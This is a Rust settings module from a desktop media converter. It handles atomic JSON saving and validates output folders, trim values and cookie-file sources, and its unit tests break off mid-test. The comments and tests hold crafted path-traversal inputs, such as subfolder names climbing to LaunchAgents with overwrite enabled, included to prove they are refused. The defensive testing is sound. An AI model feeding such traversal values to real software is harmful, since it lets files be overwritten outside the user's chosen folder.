//! Persisting [`Settings`] as JSON in the OS config directory, and the one part of them that is a
//! security boundary rather than a preference: where output files are written.
//!
//! One small file, written atomically (write a *uniquely named* temp file, then rename) so neither a
//! crash nor a second concurrent save can leave the user with a truncated settings file that would
//! reset their preferences on next launch.

use convert_core::settings::{
    cookie_browser, CookieSource, LinkSettings, OutputLocation, OutputSettings, TrimSettings,
    COOKIE_BROWSERS, MAX_TRIM_SECS,
};
use convert_core::Settings;
use std::path::{Component, Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};
use tauri::{AppHandle, Manager, Runtime};

const FILE_NAME: &str = "settings.json";

/// `~/Library/Application Support/app.crossconverter.desktop/settings.json` on macOS.
pub fn path<R: Runtime>(app: &AppHandle<R>) -> Result<PathBuf, String> {
    let dir =
        app.path().app_config_dir().map_err(|e| format!("no writable config directory: {e}"))?;
    Ok(dir.join(FILE_NAME))
}

/// Read settings from disk. A missing or corrupt file is not an error - we fall back to defaults,
/// which are deliberately the "Web & Demo" one-click preset.
///
/// A file that parses but asks for an impossible *destination* is repaired rather than discarded:
/// this file is plain JSON in the user's own config directory, so `"subfolder_name": "../.."` can
/// arrive from a hand edit as well as from a compromised webview, and throwing away every other
/// preference over one bad field would be its own small data loss.
pub fn load<R: Runtime>(app: &AppHandle<R>) -> Option<Settings> {
    load_file(&path(app).ok()?)
}

/// [`load`] from an explicit path, so the repair above is testable without a config directory.
///
/// Only a *hostile* destination is repaired, and it is repaired wholesale: a file is not an edit in
/// progress, so there is no half-typed value here worth keeping, and resetting the whole `output`
/// block is the conservative answer to a blob we did not write. A destination that is merely
/// *unfinished* ("Custom folder" with no folder chosen) is kept as it is: it cannot write anywhere,
/// every command that would write through it refuses, and the settings page can render it honestly
/// as the choice the user left half-made.
///
/// The trim is treated on the same terms: a number that could not have been sent by this app
/// (negative, unreadable, longer than a day) is reset to "no trim", while a trim that is merely
/// unfinished is left for `check_trim` to decline.
///
/// So is the cookie source, and there it also settles a question time can answer differently: the
/// `cookies.txt` that existed when the file was written may have been deleted, moved or replaced by
/// a folder since. A source we cannot point yt-dlp at is reset to "no cookies" rather than kept as a
/// promise the next fetch would break in silence.
pub fn load_file(file: &Path) -> Option<Settings> {
    let raw = std::fs::read_to_string(file).ok()?;
    let mut settings: Settings = serde_json::from_str(&raw).ok()?;
    settings.crop = None;
    if let Destination::Hostile(why) = classify_output(&settings.output) {
        eprintln!("[flint] ignoring the saved output location ({why})");
        settings.output = OutputSettings::default();
    }
    // A trim we would refuse over IPC is repaired the same way when it comes off disk: this file is
    // plain JSON in the user's own config directory, so `"start_secs": -30` can arrive from a hand
    // edit, and acting on it is not an option we want anywhere.
    if let Trim::Refused(why) = classify_trim(&settings.trim) {
        eprintln!("[flint] ignoring the saved trim ({why})");
        settings.trim = TrimSettings::default();
    }
    // Same treatment, and note what is in `why` and what is not: a browser name we will not use, or
    // the *path* of a cookies file that is no longer a file. Never a cookie, because nothing in this
    // app opens that file - yt-dlp does, in a child process whose output is parsed for progress and
    // never logged.
    if let Cookies::Refused(why) = classify_cookies(&settings.link) {
        eprintln!("[flint] ignoring the saved cookie source ({why})");
        settings.link = LinkSettings::default();
    }
    Some(settings)
}

/// Write settings to disk, creating the config directory on first run.
pub fn save<R: Runtime>(app: &AppHandle<R>, settings: &Settings) -> Result<(), String> {
    let file = path(app)?;
    if let Some(parent) = file.parent() {
        std::fs::create_dir_all(parent)
            .map_err(|e| format!("could not create {}: {e}", parent.display()))?;
    }
    let json = serde_json::to_string_pretty(settings)
        .map_err(|e| format!("could not serialise settings: {e}"))?;

    // The temp name carries a per-save counter as well as the process id. Two saves from *one*
    // process used to share `settings.json.<pid>.tmp`: each truncated the other's half-written
    // file, and whichever renamed first published whatever bytes happened to be there - a torn
    // JSON file that the next launch silently reads as "no settings at all".
    static SAVE: AtomicU64 = AtomicU64::new(0);
    let n = SAVE.fetch_add(1, Ordering::Relaxed);
    let temp = file.with_extension(format!("json.{}.{n}.tmp", std::process::id()));
    std::fs::write(&temp, json).map_err(|e| format!("could not write {}: {e}", temp.display()))?;
    std::fs::rename(&temp, &file).map_err(|e| {
        // Leaving a stray `.tmp` behind would accumulate one file per failed save.
        let _ = std::fs::remove_file(&temp);
        format!("could not update {}: {e}", file.display())
    })?;
    Ok(())
}

/// What an incoming destination is, which is not the same question as "may we write through it".
///
/// `check_output` used to answer only the second one, and one `Err` covered two very different
/// events. "In a folder I choose" *starts out* with no folder chosen and a subfolder name is empty
/// for as long as it takes to retype it: nobody chose those, they are sentences the user has not
/// finished. `../..`, a relative custom folder or a folder that is not there are values that really
/// were chosen - or crafted - and would write outside the folder the files came from. Telling the
/// two apart is what lets `save_settings` keep an unrelated edit (a codec, a quality slider) made in
/// the same drawer while a destination is still half-made, without ever obeying a hostile one.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Destination {
    /// Complete, and inside what the UI is allowed to ask for. Safe to write through.
    Usable,
    /// Begun and not finished. Nothing to refuse and nothing to repair: the *place* is held back,
    /// every other preference is persisted, and anything that writes still declines - with this
    /// message, which reads as "not yet" rather than as an accusation.
    Unfinished(String),
    /// Escapes the folder the files came from, is not absolute, or is not a folder at all. Refused
    /// *and* repaired: this is the one the earlier audit exists for.
    Hostile(String),
}

/// Is this output configuration one we are willing to write files through?
///
/// The gate for every command that writes through the destination or promises where a file will
/// land ([`crate::commands::start_batch`], [`crate::commands::estimate_output_path`]): both an
/// unfinished and a hostile destination are refused here, because neither of them names a folder we
/// can put a file in. Only `save_settings` needs the finer answer, and it asks
/// [`classify_output`] for it.
pub fn check_output(output: &OutputSettings) -> Result<(), String> {
    match classify_output(output) {
        Destination::Usable => Ok(()),
        Destination::Unfinished(why) | Destination::Hostile(why) => Err(why),
    }
}

/// Classify a destination.
///
/// `Settings` arrive over IPC and decide a filesystem *destination*, which makes them the only part
/// of the payload that can do damage on its own: `subfolder_name: "../../../../Library/LaunchAgents"`
/// turns every conversion into a write outside the folder the user dropped, and with
/// `on_conflict: "overwrite"` into a write over a file they never chose. So the rule for
/// [`Destination::Usable`] stays the narrow one the UI actually needs - a relative name made of
/// ordinary components, or an absolute folder that already exists - and anything that is not merely
/// half-typed is [`Destination::Hostile`], by name.
pub fn classify_output(output: &OutputSettings) -> Destination {
    match output.location {
        OutputLocation::SameFolder => Destination::Usable,
        OutputLocation::Subfolder => classify_subfolder(&output.subfolder_name),
        OutputLocation::Custom => match output.custom_dir.as_deref() {
            // `output_path` silently falls back to the input's own folder, which is not what
            // "Custom folder" says on the settings page - so this is never *usable*. It is also
            // exactly the state the picker is in before the user has been to the file dialog.
            None => Destination::Unfinished(NO_FOLDER_YET.into()),
            Some(dir) if is_blank(dir) => Destination::Unfinished(NO_FOLDER_YET.into()),
            Some(dir) => classify_custom_dir(dir),
        },
    }
}

/// Shown while "Custom folder" is selected and no folder has been picked yet.
const NO_FOLDER_YET: &str = "Choose an output folder, or switch back to a subfolder.";

/// A path the user has cleared, or never filled in. Whitespace counts: a text field the user
/// emptied with a keystroke arrives as `" "` just as often as `""`.
fn is_blank(dir: &Path) -> bool {
    dir.as_os_str().is_empty() || dir.to_string_lossy().trim().is_empty()
}

fn classify_subfolder(name: &str) -> Destination {
    if name.trim().is_empty() {
        // Mid-rename, not an attack: the field is empty for as long as it takes to type a new name.
        return Destination::Unfinished("The output subfolder needs a name.".into());
    }
    let path = Path::new(name);
    if path.is_absolute() {
        return Destination::Hostile(
            "The output subfolder must be a name, not a full path.".into(),
        );
    }
    for part in path.components() {
        if !matches!(part, Component::Normal(_)) {
            return Destination::Hostile(
                "The output subfolder must stay inside the folder the files came from.".into(),
            );
        }
    }
    Destination::Usable
}

fn classify_custom_dir(dir: &Path) -> Destination {
    if !dir.is_absolute() {
        return Destination::Hostile("The output folder must be a full path.".into());
    }
    if dir.components().any(|c| c == Component::ParentDir) {
        return Destination::Hostile("The output folder must not contain `..`.".into());
    }
    if !dir.is_dir() {
        // A folder the user really did choose and that is no longer there (renamed, unmounted, or
        // never existed): a value to refuse and repair, not one to wait for. Creating it would put
        // files wherever the payload pointed.
        return Destination::Hostile(format!(
            "The output folder {} no longer exists.",
            dir.display()
        ));
    }
    Destination::Usable
}

/// What an incoming trim is, on the same three terms as a destination.
///
/// A trim is two numbers out of a text field, so "the length is 0" happens for as long as it takes
/// to clear the box and type `10` - the same "not finished" state "Custom folder with no folder
/// chosen" is in, and it must not cost the user the codec they changed in the same drawer. A
/// negative, unreadable or week-long number is a value that really was sent, and comes back with a
/// reason.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Trim {
    /// Two numbers FFmpeg can be handed.
    Usable,
    /// Begun and not finished: trimming is on and no length has been typed yet. Held at the last
    /// usable trim, nothing said, and anything that would convert through it declines.
    Unfinished(String),
    /// Not a number, negative, or longer than [`MAX_TRIM_SECS`]. Held *and* reported.
    Refused(String),
}

/// Is this trim one we are willing to convert through?
///
/// The gate for [`crate::commands::start_batch`], and the reason it is a gate at all: with
/// `enabled: true` and a length of `0` the planner adds no `-ss`/`-t` (see
/// `TrimSettings::effective`), so the batch would convert every file in full while the window says
/// it is cutting them to zero. Refusing is the honest answer; the message says what to type.
pub fn check_trim(trim: &TrimSettings) -> Result<(), String> {
    match classify_trim(trim) {
        Trim::Usable => Ok(()),
        Trim::Unfinished(why) | Trim::Refused(why) => Err(why),
    }
}

/// Classify a trim, per field, in the order the user reads them.
pub fn classify_trim(trim: &TrimSettings) -> Trim {
    if let Some(why) = out_of_range("start", trim.start_secs) {
        return Trim::Refused(why);
    }
    if let Some(why) = out_of_range("length", trim.length_secs) {
        return Trim::Refused(why);
    }
    // Only while trimming is *on*: a stored `length_secs: 0` behind an unticked checkbox is inert,
    // and refusing it would mean the user cannot save anything else until they tidy up a number
    // nothing is reading.
    if trim.enabled && trim.length_secs <= 0.0 {
        return Trim::Unfinished("Enter how many seconds of each file to keep.".into());
    }
    Trim::Usable
}

/// The one rule both numbers share: a real, non-negative number of seconds, at most a day of them.
///
/// Checked even while trimming is off, because `NaN` and infinity are not values we can *store* at
/// all: `serde_json` writes a non-finite float as `null`, and `null` is not a number the next launch
/// can read back - the settings file would fail to parse and every preference in it would be
/// replaced by the defaults on the following save. So they are refused at the door, and
/// [`merge`] holds the last trim we were willing to write.
fn out_of_range(field: &str, value: f64) -> Option<String> {
    if !value.is_finite() {
        return Some(format!("The trim {field} must be a number of seconds."));
    }
    if value < 0.0 {
        return Some(format!("The trim {field} cannot be negative."));
    }
    if value > MAX_TRIM_SECS {
        return Some(format!("The trim {field} cannot be longer than 24 hours."));
    }
    None
}

/// Fold an incoming `Settings` into the one we already have, field by field, and say what - if
/// anything - was refused.
///
/// The bug this exists for: `save_settings` validated the whole object and refused it wholesale, so
/// a user who changed a *codec* in the drawer while the destination was half-chosen silently lost
/// the codec. Every field except the destination is a preference that is valid on its own and is
/// therefore persisted as sent; only the *place* files land in (location + the name or folder that
/// goes with it) can be held back, and the preferences that happen to live beside it in `output`
/// (conflict policy, worker count, timestamps) are kept like any other.
///
/// * [`Destination::Usable`] - stored as sent.
/// * [`Destination::Unfinished`] - the place is held at the last one we were willing to write
///   through; nothing is refused, because the user is still typing.
/// * [`Destination::Hostile`] - the place is repaired the same way, *and* the reason comes back so
///   the caller can say so. Repaired rather than silently accepted, and reported rather than
///   silently repaired: the settings page keeps showing what the user typed, so saying nothing
///   would make it lie about where files are going to land.
///
/// The trim is held to exactly the same discipline for exactly the same reason, and as one group:
/// storing `enabled: true` beside a *held* length would trim every clip in the batch to a number
/// the user never typed.
///
/// So is the cookie source, and as one group for the sharper version of that reason: storing "from a
/// browser" beside a *held* browser name would be a settings page claiming to borrow a sign-in that
/// no command line would ever ask for.
pub fn merge(current: &Settings, incoming: Settings) -> (Settings, Option<String>) {
    let mut merged = incoming;
    merged.crop = None;
    let verdict = classify_output(&merged.output);
    if !matches!(verdict, Destination::Usable) {
        let kept = last_usable_place(&current.output);
        merged.output.location = kept.location;
        merged.output.custom_dir = kept.custom_dir;
        merged.output.subfolder_name = kept.subfolder_name;
    }
    let trim_verdict = classify_trim(&merged.trim);
    if !matches!(trim_verdict, Trim::Usable) {
        merged.trim = last_usable_trim(&current.trim);
    }
    let cookie_verdict = classify_cookies(&merged.link);
    if !matches!(cookie_verdict, Cookies::Usable) {
        merged.link = last_usable_cookies(&current.link);
    }
    match (verdict, trim_verdict, cookie_verdict) {
        // The destination first: it is the one that can write somewhere the user did not choose.
        (Destination::Hostile(why), _, _) => (merged, Some(why)),
        (_, Trim::Refused(why), _) => (merged, Some(why)),
        (_, _, Cookies::Refused(why)) => (merged, Some(why)),
        _ => (merged, None),
    }
}

/// The place to fall back on. Normally whatever is already saved; the defaults if that is itself
/// hostile, which nothing in this process can store but a hand-edited file could have contained.
fn last_usable_place(current: &OutputSettings) -> OutputSettings {
    match classify_output(current) {
        Destination::Hostile(_) => OutputSettings::default(),
        _ => current.clone(),
    }
}

/// The trim to fall back on, on the same terms as [`last_usable_place`]: what is saved, unless that
/// is itself a number we would refuse.
fn last_usable_trim(current: &TrimSettings) -> TrimSettings {
    match classify_trim(current) {
        Trim::Usable => *current,
        _ => TrimSettings::default(),
    }
}

/// What an incoming cookie source is, on the same three terms as a destination and a trim.
///
/// The third group in this file that needs all three answers, and the one where getting it wrong is
/// most expensive. "From a cookies.txt file" begins with no file chosen and the path field is empty
/// for as long as it takes to paste one: that is a sentence the user has not finished, and holding
/// it back silently is what lets them keep the codec they changed in the same drawer. A browser name
/// that is not on `COOKIE_BROWSERS`, or a file that is not there, is a value that really was sent -
/// and one we cannot act on at all, since [`convert_core::settings::LinkSettings::effective`] would
/// quietly drop it and the fetch would run with no sign-in while the settings page said otherwise.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Cookies {
    /// Either "no cookies", or a source yt-dlp can actually be pointed at.
    Usable,
    /// Begun and not finished: a mode is selected and the browser or the file it needs is still
    /// blank. Held at the last usable source, nothing said, and anything that would fetch declines.
    Unfinished(String),
    /// A browser we will not name on a command line, or a file that is not there. Held *and*
    /// reported: the settings page goes on showing what the user chose, so saying nothing would let
    /// it promise a sign-in that will never be sent.
    Refused(String),
}

/// Is this cookie source one we are willing to fetch a link through?
///
/// The gate for [`crate::commands::start_batch`], on exactly the reasoning behind [`check_trim`]:
/// with "from a cookies.txt file" selected and no file chosen, `LinkSettings::effective` yields no
/// flag at all, so the batch would fetch every link *without* a sign-in while the drawer says it is
/// borrowing one - and the failure the user then reads would be about the video.
pub fn check_cookies(link: &LinkSettings) -> Result<(), String> {
    match classify_cookies(link) {
        Cookies::Usable => Ok(()),
        Cookies::Unfinished(why) | Cookies::Refused(why) => Err(why),
    }
}

/// Classify a cookie source, per mode, looking only at the field that mode actually reads.
///
/// A browser left over from an earlier choice is not judged while the mode is "from a file", and a
/// path left over is not judged while the mode is "from a browser" - the same rule
/// [`classify_output`] follows, and the reason a user can switch back and forth without being told
/// off about a field that is not in play.
pub fn classify_cookies(link: &LinkSettings) -> Cookies {
    match link.cookies {
        // Nothing is read, so there is nothing to be wrong. Whatever is sitting in the other two
        // fields is inert, exactly like a stored trim length behind an unticked checkbox.
        CookieSource::None => Cookies::Usable,
        CookieSource::Browser => classify_cookie_browser(&link.cookie_browser),
        CookieSource::File => match link.cookie_file.as_deref() {
            None => Cookies::Unfinished(NO_COOKIES_FILE_YET.into()),
            Some(path) if is_blank(path) => Cookies::Unfinished(NO_COOKIES_FILE_YET.into()),
            Some(path) => classify_cookie_file(path),
        },
    }
}

/// Shown while "from a cookies.txt file" is selected and no file has been chosen yet.
const NO_COOKIES_FILE_YET: &str =
    "Choose the cookies.txt file to read the sign-in from, or take it from a browser instead.";

/// Shown while "from a browser" is selected and no browser has been picked yet.
const NO_BROWSER_YET: &str = "Choose which browser to borrow the sign-in from.";

fn classify_cookie_browser(name: &str) -> Cookies {
    if name.trim().is_empty() {
        // The state the drawer is in the instant "from a browser" is selected, before the dropdown
        // has been touched. Not a mistake, and not worth a toast.
        return Cookies::Unfinished(NO_BROWSER_YET.into());
    }
    if cookie_browser(name).is_none() {
        // Refused by name, and the allowlist is spelled out rather than hinted at: this is the one
        // refusal here whose fix is "pick one of these".
        return Cookies::Refused(format!(
            "Flint cannot take a sign-in from that browser. Choose one of: {}.",
            COOKIE_BROWSERS.join(", ")
        ));
    }
    Cookies::Usable
}

/// A `cookies.txt` the user exported. Refused unless it is an absolute path to a file that is there
/// right now, because every other answer ends in a fetch that silently sends no sign-in.
///
/// The path is echoed. It is not a secret - the user typed or chose it, and it appears in their own
/// file dialog - and naming the file is the difference between a message they can act on and one
/// they cannot. What is inside the file is never read here, or anywhere in this app.
fn classify_cookie_file(path: &Path) -> Cookies {
    if !path.is_absolute() {
        return Cookies::Refused("The cookies file must be a full path.".into());
    }
    if !path.exists() {
        return Cookies::Refused(format!(
            "The cookies file {} is not there. Export cookies.txt from your browser again and \
             choose it, or take the sign-in from a browser instead.",
            path.display()
        ));
    }
    if !path.is_file() {
        return Cookies::Refused(format!(
            "{} is a folder, not a cookies.txt file. Choose the exported file itself.",
            path.display()
        ));
    }
    Cookies::Usable
}

/// The cookie source to fall back on, on the same terms as [`last_usable_place`].
fn last_usable_cookies(current: &LinkSettings) -> LinkSettings {
    match classify_cookies(current) {
        Cookies::Usable => current.clone(),
        _ => LinkSettings::default(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use convert_core::settings::ConflictPolicy;

    #[test]
    fn crop_selection_is_never_loaded_or_merged_into_preferences() {
        use convert_core::crop::{CropSettings, MediaCrop};
        let incoming = Settings {
            crop: Some(CropSettings {
                media: Some(MediaCrop { start_secs: 10.0, length_secs: 40.0 }),
                ..Default::default()
            }),
            ..Default::default()
        };
        let (merged, error) = merge(&Settings::default(), incoming.clone());
        assert!(error.is_none());
        assert!(merged.crop.is_none());
        let file =
            std::env::temp_dir().join(format!("cc-crop-settings-{}.json", std::process::id()));
        std::fs::write(&file, serde_json::to_vec(&incoming).unwrap()).unwrap();
        assert!(load_file(&file).unwrap().crop.is_none());
        std::fs::remove_file(file).unwrap();
    }

    fn subfolder(name: &str) -> OutputSettings {
        OutputSettings {
            location: OutputLocation::Subfolder,
            subfolder_name: name.into(),
            ..Default::default()
        }
    }

    /// The attack: the webview owns `Settings`, and `output_dir` joins `subfolder_name` onto the
    /// dropped file's own folder. A relative climb plus `Overwrite` writes converted bytes over any
    /// file the user can write - a launch agent, another app's data file - with no dialog anywhere.
    #[test]
    fn a_subfolder_name_can_never_climb_out_of_the_source_folder() {
        assert!(check_output(&subfolder("Converted")).is_ok());
        assert!(check_output(&subfolder("Converted/2026")).is_ok(), "nesting is fine");

        for crafted in [
            "../../../../Users/me/Library/LaunchAgents",
            "..",
            "Converted/../..",
            "/Users/me/Library/LaunchAgents",
            "/",
            "",
            "   ",
        ] {
            let err = check_output(&subfolder(crafted)).expect_err(crafted);
            assert!(!err.is_empty(), "{crafted}");
        }
        // The policy is irrelevant to the check: the escape is the problem, not the overwrite.
        let mut overwriting = subfolder("../elsewhere");
        overwriting.on_conflict = ConflictPolicy::Overwrite;
        assert!(check_output(&overwriting).is_err());
    }

    #[test]
    fn a_custom_folder_has_to_be_an_absolute_folder_that_exists() {
        let real = std::env::temp_dir();
        let ok = OutputSettings {
            location: OutputLocation::Custom,
            custom_dir: Some(real),
            ..Default::default()
        };
        assert!(check_output(&ok).is_ok());

        for crafted in [Some(PathBuf::from("relative/dir")), Some(PathBuf::from("")), None] {
            let bad = OutputSettings {
                location: OutputLocation::Custom,
                custom_dir: crafted.clone(),
                ..Default::default()
            };
            assert!(check_output(&bad).is_err(), "{crafted:?}");
        }
        let climbing = OutputSettings {
            location: OutputLocation::Custom,
            custom_dir: Some(std::env::temp_dir().join("..").join("etc")),
            ..Default::default()
        };
        assert!(check_output(&climbing).is_err());
    }

    /// "Same folder" has no name to validate, and must keep working: it is the one mode where the
    /// destination is decided entirely by where the user's own file already is.
    #[test]
    fn same_folder_needs_no_permission() {
        let same = OutputSettings { location: OutputLocation::SameFolder, ..Default::default() };
        assert!(check_output(&same).is_ok());
    }

    /// This file is plain JSON in the user's own config directory, so a climbing subfolder can
    /// arrive from a hand edit (or a previous version of this app) as well as over IPC. The
    /// destination is repaired; every other preference in the file is kept.
    #[test]
    fn a_hand_edited_file_that_climbs_out_is_repaired_not_obeyed() {
        let dir = std::env::temp_dir().join(format!("cc-settings-load-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("mkdir");

        let file = dir.join("settings.json");
        std::fs::write(
            &file,
            r#"{ "image": { "quality": 42 },
                 "output": { "location": "subfolder", "subfolder_name": "../../../..",
                             "on_conflict": "overwrite" } }"#,
        )
        .expect("write");

        let loaded = load_file(&file).expect("a parseable file still loads");
        assert_eq!(loaded.image.quality, 42, "unrelated preferences must survive the repair");
        assert_eq!(loaded.output, OutputSettings::default());
        assert!(check_output(&loaded.output).is_ok());

        // Unreadable and unparseable files are still "no settings", i.e. the defaults.
        std::fs::write(&file, b"{ not json").expect("write");
        assert!(load_file(&file).is_none());
        assert!(load_file(&dir.join("absent.json")).is_none());
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// The data loss the forgiving deserializer exists to prevent, seen from the file: a settings
    /// file written by a *newer* build of the app (a preset we do not have, a codec that does not
    /// exist yet, a section that is new) used to fail to parse - and a file that does not parse is
    /// "no settings at all", so the user downgrades once and the next save writes the defaults
    /// over everything they had chosen.
    #[test]
    fn a_settings_file_from_a_newer_version_keeps_the_choices_this_version_understands() {
        use convert_core::settings::VideoCodec;

        let dir = std::env::temp_dir().join(format!("cc-settings-future-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("mkdir");
        let file = dir.join("settings.json");
        std::fs::write(
            &file,
            r#"{ "preset": "cinema_4k",
                 "video": { "codec": "h266", "max_height": 720 },
                 "image": { "quality": 42 },
                 "output": { "location": "subfolder", "subfolder_name": "Done",
                             "parallel_jobs": 3 },
                 "captions": { "burn_in": true } }"#,
        )
        .expect("write");

        let loaded = load_file(&file).expect("a file from a newer version must still load");
        assert_eq!(loaded.image.quality, 42);
        assert_eq!(loaded.video.max_height, Some(720));
        assert_eq!(loaded.output.subfolder_name, "Done");
        assert_eq!(loaded.output.parallel_jobs, 3);
        // The one value we genuinely cannot read is the only thing that falls back.
        assert_eq!(loaded.video.codec, VideoCodec::Auto);
        assert!(check_output(&loaded.output).is_ok());
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// The line this module now draws, in both directions.
    ///
    /// "In a folder I choose" begins with no folder chosen and a subfolder name is empty for as long
    /// as it takes to retype it: those are sentences the user has not finished, and `check_output`
    /// still declines to write through them - but they are not the same event as a value that climbs
    /// out of the source folder, is not absolute, or names something that is not a folder. Only the
    /// second kind is hostile, and only the second kind is worth telling the user about.
    #[test]
    fn a_half_typed_destination_is_unfinished_and_a_climbing_one_is_hostile() {
        let unfinished = [
            subfolder(""),
            subfolder("   "),
            OutputSettings { location: OutputLocation::Custom, ..Default::default() },
            OutputSettings {
                location: OutputLocation::Custom,
                custom_dir: Some(PathBuf::from("")),
                ..Default::default()
            },
            OutputSettings {
                location: OutputLocation::Custom,
                custom_dir: Some(PathBuf::from("  ")),
                ..Default::default()
            },
        ];
        for output in unfinished {
            assert!(
                matches!(classify_output(&output), Destination::Unfinished(_)),
                "{output:?} is a choice in progress, not an attack"
            );
            // ...and nothing may be written through it all the same.
            assert!(check_output(&output).is_err(), "{output:?}");
        }

        for name in ["../../../../Library/LaunchAgents", "..", "Converted/../..", "/etc", "/"] {
            assert!(
                matches!(classify_output(&subfolder(name)), Destination::Hostile(_)),
                "`{name}` escapes the folder the files came from"
            );
        }
        for dir in [PathBuf::from("relative/dir"), std::env::temp_dir().join("..").join("etc")] {
            let output = OutputSettings {
                location: OutputLocation::Custom,
                custom_dir: Some(dir.clone()),
                ..Default::default()
            };
            assert!(matches!(classify_output(&output), Destination::Hostile(_)), "{dir:?}");
        }
        // A folder that really was chosen and is not there: refused, not waited for.
        let gone = OutputSettings {
            location: OutputLocation::Custom,
            custom_dir: Some(std::env::temp_dir().join("cc-not-here-at-all")),
            ..Default::default()
        };
        assert!(matches!(classify_output(&gone), Destination::Hostile(_)));

        assert_eq!(classify_output(&subfolder("Converted")), Destination::Usable);
        assert_eq!(classify_output(&subfolder("Converted/2026")), Destination::Usable);
    }

    /// The data loss this fix exists for: one unfinished field used to discard every other edit in
    /// the same payload. Per field now - the codec is stored, the half-made destination is held at
    /// the last one we were willing to write through, and only a hostile one is reported back.
    #[test]
    fn an_unfinished_destination_holds_the_place_and_keeps_every_other_edit() {
        use convert_core::settings::VideoCodec;

        let mut current = Settings::default();
        current.output.subfolder_name = "Converted".into();

        // The user changes a codec while "Custom folder" is selected and no folder is chosen yet.
        let mut incoming = current.clone();
        incoming.video.codec = VideoCodec::Av1;
        incoming.image.quality = 61;
        incoming.output.location = OutputLocation::Custom;
        incoming.output.custom_dir = None;
        // ...and flips a preference that merely lives next to the destination.
        incoming.output.on_conflict = ConflictPolicy::Skip;

        let (merged, refused) = merge(&current, incoming);
        assert_eq!(refused, None, "an unfinished destination is not the user's mistake");
        assert_eq!(merged.video.codec, VideoCodec::Av1, "the codec edit must survive");
        assert_eq!(merged.image.quality, 61);
        assert_eq!(
            merged.output.on_conflict,
            ConflictPolicy::Skip,
            "a valid field is a valid field"
        );
        assert_eq!(merged.output.location, OutputLocation::Subfolder, "the place is held");
        assert_eq!(merged.output.subfolder_name, "Converted");
        assert!(check_output(&merged.output).is_ok(), "what we store must be writable");

        // A hostile destination: same rescue of the other fields, but the reason comes back so the
        // settings page cannot go on showing a destination nothing will ever write to.
        let mut crafted = current.clone();
        crafted.audio.bitrate_kbps = 320;
        crafted.output.subfolder_name = "../../../../Library/LaunchAgents".into();
        crafted.output.on_conflict = ConflictPolicy::Overwrite;
        let (merged, refused) = merge(&current, crafted);
        assert!(
            refused.is_some(),
            "a climbing destination must be reported, not silently repaired"
        );
        assert_eq!(merged.audio.bitrate_kbps, 320, "the valid fields are still saved");
        assert_eq!(merged.output.subfolder_name, "Converted", "the climb is repaired");
        assert!(check_output(&merged.output).is_ok());

        // A complete destination is simply stored.
        let mut chosen = current.clone();
        chosen.output.location = OutputLocation::Custom;
        chosen.output.custom_dir = Some(std::env::temp_dir());
        let (merged, refused) = merge(&current, chosen.clone());
        assert_eq!(refused, None);
        assert_eq!(merged.output, chosen.output);

        // And if what we already had was itself hostile (a hand-edited file), the fallback is the
        // default rather than the climb.
        let mut poisoned = Settings::default();
        poisoned.output.subfolder_name = "../..".into();
        let mut half = Settings::default();
        half.output.location = OutputLocation::Custom;
        half.output.custom_dir = None;
        let (merged, _) = merge(&poisoned, half);
        assert_eq!(merged.output.subfolder_name, OutputSettings::default().subfolder_name);
        assert!(check_output(&merged.output).is_ok());
    }

    fn trim(enabled: bool, start: f64, length: f64) -> TrimSettings {
        TrimSettings { enabled, start_secs: start, length_secs: length }
    }

    /// Two numbers out of two text fields, so the same three answers a destination gets: usable,
    /// not finished yet, and one nobody could have typed by accident.
    #[test]
    fn a_trim_has_to_be_two_sane_numbers() {
        assert_eq!(classify_trim(&TrimSettings::default()), Trim::Usable);
        assert_eq!(classify_trim(&trim(true, 30.0, 10.0)), Trim::Usable);
        assert_eq!(classify_trim(&trim(true, 0.0, 0.5)), Trim::Usable, "half a second is a trim");
        assert_eq!(classify_trim(&trim(true, 86400.0, 86400.0)), Trim::Usable, "a day is the cap");
        assert!(check_trim(&trim(true, 30.0, 10.0)).is_ok());

        // Trimming on with no length yet: the field is empty for as long as it takes to type 10.
        // Nothing is refused, but nothing may convert through it either - the planner would ignore
        // a zero-length trim and convert every file in full while the window says otherwise.
        let unfinished = classify_trim(&trim(true, 0.0, 0.0));
        assert!(matches!(unfinished, Trim::Unfinished(_)), "{unfinished:?}");
        let why = check_trim(&trim(true, 0.0, 0.0)).expect_err("a batch cannot start on this");
        assert_eq!(why, "Enter how many seconds of each file to keep.");
        // ...and the very same numbers are inert, not unfinished, while the checkbox is off.
        assert_eq!(classify_trim(&trim(false, 0.0, 0.0)), Trim::Usable);

        for bad in [
            trim(true, -1.0, 10.0),
            trim(true, 0.0, -10.0),
            trim(true, f64::NAN, 10.0),
            trim(true, 0.0, f64::INFINITY),
            trim(true, 86400.5, 10.0),
            trim(true, 0.0, 86401.0),
            // Refused even with trimming off: these are values we cannot store at all.
            trim(false, f64::NAN, 10.0),
            trim(false, 0.0, -1.0),
        ] {
            match classify_trim(&bad) {
                Trim::Refused(why) => {
                    assert!(why.starts_with("The trim "), "{bad:?} -> {why}");
                    assert!(why.ends_with('.'), "{bad:?} -> {why}");
                }
                other => panic!("{bad:?} should be refused, got {other:?}"),
            }
            assert!(check_trim(&bad).is_err(), "{bad:?}");
        }
        // The message names the field that is wrong, because there are two of them on screen.
        assert_eq!(
            classify_trim(&trim(true, -5.0, 10.0)),
            Trim::Refused("The trim start cannot be negative.".into())
        );
        assert_eq!(
            classify_trim(&trim(true, 0.0, f64::NAN)),
            Trim::Refused("The trim length must be a number of seconds.".into())
        );
        assert_eq!(
            classify_trim(&trim(true, 0.0, 90000.0)),
            Trim::Refused("The trim length cannot be longer than 24 hours.".into())
        );
    }

    /// The same per-field discipline the destination gets, for the same reason: a half-typed number
    /// must not throw away the codec the user changed in the same drawer. The trim is held as one
    /// group - storing `enabled: true` beside a *held* length would cut every clip in the batch to a
    /// number the user never typed.
    #[test]
    fn a_half_typed_trim_holds_the_trim_and_keeps_every_other_edit() {
        use convert_core::settings::VideoCodec;

        let current = Settings { trim: trim(true, 30.0, 10.0), ..Default::default() };

        // The user clears the length field and changes a codec while it is empty.
